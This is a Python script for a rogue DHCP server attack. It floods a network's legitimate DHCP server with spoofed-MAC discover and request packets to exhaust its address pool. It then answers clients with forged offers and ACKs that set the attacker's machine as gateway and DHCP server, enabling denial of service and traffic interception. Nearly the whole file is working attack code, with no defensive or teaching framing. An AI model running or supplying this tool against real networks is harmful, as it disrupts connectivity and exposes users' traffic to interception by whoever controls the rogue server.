#!/usr/bin/env python3

from scapy.arch import get_if_addr, get_if_hwaddr
from scapy.base_classes import Net
from scapy.volatile import RandMAC
from scapy.layers.l2 import conf
from typing import Tuple
from typing import TypeVar

import socket

StructDHCPHint = TypeVar("StructDHCPHint", bound="StructDHCP")


class StructDHCP:

    OP = bytes([0xff])
    HTYPE = bytes([0x01])
    HLEN = bytes([0x06])
    HOPS = bytes([0x00])
    XID = bytes([0x39, 0x03, 0xF3, 0x26])
    SECS = bytes([0x00, 0x00])
    FLAGS = bytes([0x00, 0x00])
    CIADDR = bytes([0x00, 0x00, 0x00, 0x00])
    YIADDR = bytes([0xff, 0xff, 0xff, 0xff]) # IP Offered
    SIADDR = bytes([0xff, 0xff, 0xff, 0xff]) # IP of the DHCP Server
    GIADDR = bytes([0x00, 0x00, 0x00, 0x00])
    CHADDR1 = bytes([0x02, 0x42, 0xac, 0x11]) 
    CHADDR2 = bytes([0x00, 0x02, 0x00, 0x00])
    CHADDR3 = bytes([0x00, 0x00, 0x00, 0x00]) 
    CHADDR4 = bytes([0x00, 0x00, 0x00, 0x00]) 
    CHADDR5 = bytes(192)
    Magiccookie = bytes([0x63, 0x82, 0x53, 0x63])
    DHCPOptions1 = bytes([53, 1, 0xff]) # DHCP Message Type
    DHCPOptions2 = bytes([1, 4, 0xFF, 0xFF, 0xFF, 0x00]) # 255.255.255.0 subnet mask
    DHCPOptions3 = bytes([3, 4, 0xff, 0xff, 0xff, 0xff]) # Gateway
    DHCPOptions4 = bytes([51, 4, 0x00, 0x01, 0x51, 0x80]) # 86400s(1 day) IP address lease time
    DHCPOptions5 = bytes([54, 4, 0xff, 0xff, 0xff, 0xff]) # DHCP server option

    DHCPOptions = {
        "DHCP_MESSAGE_TYPE": bytes([53 , 1 , 1]),
        "REQUEST_IP": bytes([50 , 4 , 0xC0, 0xA8, 0x01, 0x64])
    }

    DHCP_MESSAGE = {
        "DISCOVER": 0x1,
        "OFFER": 0x2,
        "REQUEST": 0x3,
        "ACK": 0x4
    }

    BOOT = {
        "REQUEST": 0x1,
        "REPLY": 0x2
    }
    def __init__(self) -> None:
        pass

    def ip2bytes(self, ip: str) -> bytes:
        return bytes([int(i) for i in ip.split(".")])


    def buildPacket(self) -> bytes:
        """
        Build packet with self information.
        """
        # Build the packet
        packet =  b"".join([
            self.OP,
            self.HTYPE,
            self.HLEN,
            self.HOPS,
            self.XID,
            self.SECS,
            self.FLAGS,
            self.CIADDR,
            self.YIADDR,
            self.SIADDR,
            self.GIADDR,
            self.CHADDR1,
            self.CHADDR2,
            self.CHADDR3,
            self.CHADDR4,
            self.CHADDR5,
            self.Magiccookie,
            self.DHCPOptions1
        ])

        # Check if it is a response from the server
        if self.OP == self.BOOT["REPLY"]:
            packet += b"".join([
                self.DHCPOptions2,
                self.DHCPOptions3,
                self.DHCPOptions4,
                self.DHCPOptions5
            ])
        
        return packet


    def buildParams(self, gateway: str, ip_offer: str, messageType: int, op: int, dst_ip: str = "0.0.0.0", mac: bytes = b"de:ad:de:ad:de:ad") -> None:
        # Change Message Type (Reply)
        self.OP = bytes([op])
        # Change gateway
        self.SIADDR = self.ip2bytes(gateway)
        # Change destination IP
        self.GIADDR = self.ip2bytes(dst_ip)
        # Change MAC
        self.CHADDR1 = bytes.fromhex(mac.replace(":", "")[:4])
        self.CHADDR2 = bytes.fromhex(mac.replace(":", "")[4:]) + bytes([0x0, 0x0])

        # Change Options
        self.DHCPOptions3 = b"%s%s" % (self.DHCPOptions3[:2], self.SIADDR)
        self.DHCPOptions5 = b"%s%s" % (self.DHCPOptions5[:2], self.SIADDR)

        # Change IP Offer
        self.YIADDR = self.ip2bytes(ip_offer)

        # Change DHCP Message Type (Offer)
        self.DHCPOptions1 = b"%s%s" % (self.DHCPOptions1[:2], bytes([messageType]))


    def buildDiscover(self, dst_ip: str, mac: str) -> bytes:
        self.buildParams("0.0.0.0", "0.0.0.0", self.DHCP_MESSAGE["DISCOVER"], self.BOOT["REQUEST"], dst_ip=dst_ip, mac=mac)

        return self.buildPacket()


    def buildOffer(self, gateway: str, ip_offer: str) -> bytes:
        self.buildParams(gateway, ip_offer, self.DHCP_MESSAGE["OFFER"], self.BOOT["REPLY"])

        return self.buildPacket()


    def buildRequest(self, struct: StructDHCPHint) -> bytes:
        struct.OP = bytes([self.BOOT["REQUEST"]])
        struct.DHCPOptions[bytes([0x35])] = (1, bytes([self.DHCP_MESSAGE["REQUEST"]]), )
        struct.DHCPOptions[bytes([0x32])] = (4, struct.YIADDR, )

        return self.buildPacketFromStruct(struct)


    def buildAck(self, gateway: str, ip_offer: str) -> bytes:
        self.buildParams(gateway, ip_offer, self.DHCP_MESSAGE["ACK"], self.BOOT["REPLY"])

        return self.buildPacket()


    def convertBytesToStructDHCP(self, data: bytes) -> StructDHCPHint:
        """
        Convert a message into a structure of DHCP Data.
        """
        # Convert into bytearray
        data = bytearray(data)
        # Structure
        structDHCP = StructDHCP()
        structDHCP.OP = bytes([data.pop(0)])
        structDHCP.HTYPE = bytes([data.pop(0)])
        structDHCP.HLEN = bytes([data.pop(0)])
        structDHCP.HOPS = bytes([data.pop(0)])
        structDHCP.XID = bytes([data.pop(0) for _ in range(4)])
        structDHCP.SECS = bytes([data.pop(0) for _ in range(2)])
        structDHCP.FLAGS = bytes([data.pop(0) for _ in range(2)])
        structDHCP.CIADDR = bytes([data.pop(0) for _ in range(4)])
        structDHCP.YIADDR = bytes([data.pop(0) for _ in range(4)]) # IP Offered
        structDHCP.SIADDR = bytes([data.pop(0) for _ in range(4)]) # IP of the DHCP Server
        structDHCP.GIADDR = bytes([data.pop(0) for _ in range(4)])
        structDHCP.CHHW = bytes([data.pop(0) for _ in range(6)])
        structDHCP.PADDING = bytes([data.pop(0) for _ in range(10)])
        structDHCP.SRVHOST = bytes([data.pop(0) for _ in range(64)]) 
        structDHCP.BOOTFILENAME = bytes([data.pop(0) for _ in range(128)]) 
        structDHCP.Magiccookie = bytes([data.pop(0) for _ in range(4)])
        structDHCP.DHCPOptions = {}
        while len(data):
            option = bytes([data.pop(0)])
            # End option
            if option == bytes([0xff]): break
            length = data.pop(0)
            value = bytes([data.pop(0) for _ in range(length)])
            structDHCP.DHCPOptions[option] = (length, value, )

        return structDHCP


    def buildPacketFromStruct(self, struct: StructDHCPHint) -> bytes:
        """
        Build a packet from the DHCP Structure.
        """
        packet = b"".join([
            struct.OP,
            struct.HTYPE,
            struct.HLEN,
            struct.HOPS,
            struct.XID,
            struct.SECS,
            struct.FLAGS,
            struct.CIADDR,
            struct.YIADDR,
            struct.SIADDR,
            struct.GIADDR,
            struct.CHHW,
            struct.PADDING,
            struct.SRVHOST,
            struct.BOOTFILENAME,
            struct.Magiccookie
        ])

        # Add option
        for option, length_value in struct.DHCPOptions.items():
            packet += option + bytes([length_value[0]]) + length_value[1]

        return packet

class RogueDHCPServer:

    SRV_PORT = 67
    CLIENT_PORT = 68
    MAX_BYTES = 1024
    BROADCAST = ('255.255.255.255', 68)
    BROADCAST_CLIENT = ('255.255.255.255', 67)
    ARP_BROADCAST = "ff:ff:ff:ff:ff:ff"

    def __init__(self, interface: str = "eth0") -> None:
        """
        Initialise the socket.
        """
        # Listen on an unique interface
        self.interface = interface
        self.bindIp, self.localMac = self.getLocalInfo()
        print(self.bindIp, self.localMac, self.interface)

        self.structDhcp = StructDHCP()
        self.spoofedClient = list()

        # Client Flood
        self.dhcpClientSocket, self.dhcpClientSocketRecv = self._bindClientSocket()


    def getLocalInfo(self) -> tuple:
        """
        Get current interface, @IPv4 and @MAC.
        :returns tuple((str)`local_ipv4`, (str)`local_mac`, )
        """
        local_ipv4 = get_if_addr(self.interface)
        local_mac = get_if_hwaddr(self.interface)

        if local_ipv4 == "0.0.0.0":
            self.interface = conf.iface
            return self.getLocalInfo()
        return local_ipv4, local_mac


    def _bindClientSocket(self) -> Tuple[socket.socket, socket.socket]:
        """
        Create the DHCP_UDP client socket.
        """
        dhcpSocketSend = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dhcpSocketSend.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        dhcpSocketSend.bind(("0.0.0.0", self.CLIENT_PORT))

        dhcpSocketRecv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dhcpSocketRecv.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        dhcpSocketRecv.bind(("0.0.0.0", self.SRV_PORT))
        return dhcpSocketSend, dhcpSocketRecv


    def _bindSocket(self) -> socket.socket:
        """
        Create the DHCP_UDP socket.
        """
        dhcpSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dhcpSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        dhcpSocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        dhcpSocket.bind((self.bindIp, self.SRV_PORT))
        return dhcpSocket


    def _waitForRequest(self) -> tuple:
        """
        Wait for a request.
        """
        return self.dhcpSocket.recvfrom(self.MAX_BYTES)


    def _isDiscoverRequest(self, data) -> str:
        """
        Return the Type of the DHCP Request.
        """
        return True if bytes([0x35, 0x1, 0x1]) in data else False


    def _waitForOffer(self) -> tuple:
        """
        Wait for an offer request.
        """
        return self.dhcpSocket.recvfrom(self.MAX_BYTES)


    def _sendDiscover(self) -> None:
        """
        Send an discover to the server.
        """
        self.dhcpClientSocket.sendto(self.structDhcp.buildDiscover(dst_ip=self.bindIp, mac=RandMAC()), self.BROADCAST_CLIENT)


    def _getOffer(self) -> bytes:
        """
        Receive a DHCP Offer.
        """
        # Avoid catching self request
        address = [self.bindIp]

        while address[0] == self.bindIp:
            data, address = self.dhcpClientSocketRecv.recvfrom(1024)

        print(data[16:16 + 4], address)
        return data, address


    def _sendOffer(self) -> None:
        """
        Send an offer to the client.
        """
        ipOffer = Net.int2ip(Net(self.bindIp).start + 1)
        self.dhcpSocket.sendto(self.structDhcp.buildOffer(gateway=self.bindIp, ip_offer=ipOffer), self.BROADCAST)


    def _sendRequest(self, struct: StructDHCPHint, address) -> None:
        """
        Send a request to the server.
        """
        self.dhcpClientSocket.sendto(self.structDhcp.buildRequest(struct), address)


    def _getAck(self) -> None:
        """
        Get ACK response.
        """
        self.dhcpClientSocketRecv.recvfrom(1024)


    def _sendAck(self) -> None:
        """
        Send an ACK to the client.
        """
        ipOffer = Net.int2ip(Net(self.bindIp).start + 1)
        self.dhcpSocket.sendto(self.structDhcp.buildAck(gateway=self.bindIp, ip_offer=ipOffer), self.BROADCAST)
        self.spoofedClient.append(ipOffer)


    def floodNetworkDhcp(self) -> None:
        """
        Flood Network DHCP.
        """
        # Query 255 IP
        for i in range(255):
            print(f"[i] Flood {i}/254", end="\r")
            # Discover host
            self._sendDiscover()
            # Get Offer
            data, address = self._getOffer()
            # Convert offer to DHCP Structure
            structData = self.structDhcp.convertBytesToStructDHCP(data)
            # Get IP Addr
            currentYIADDR = Net.int2ip(int(structData.YIADDR.hex(), 16))
            # Accept offer
            print(currentYIADDR)
            self._sendRequest(structData, address)
            # Get ACK
            self._getAck()

        # Close client
        self.dhcpClientSocket.close()
        self.dhcpClientSocketRecv.close()
        print()


    def daemon(self) -> None:
        """
        Make the server daemon and loop forever.
        """
        # Log
        print("[i] DHCP Server Started")
        self.dhcpSocket = self._bindSocket()

        while True:
            # Wait for a request
            data, address = self._waitForRequest()

            if self._isDiscoverRequest(data):
                print("[i - Discover] Send an Offer")
                self._sendOffer()
            else:
                self._sendAck()
                print(f"[i - Request] Send ACK, spoofed client {self.spoofedClient[-1]}")


if __name__ == '__main__':
    rogueDhcpServer = RogueDHCPServer(interface="eth0")
    # Flood le DHCP auparavant
    rogueDhcpServer.floodNetworkDhcp()
    # Rogue AP
    rogueDhcpServer.daemon()
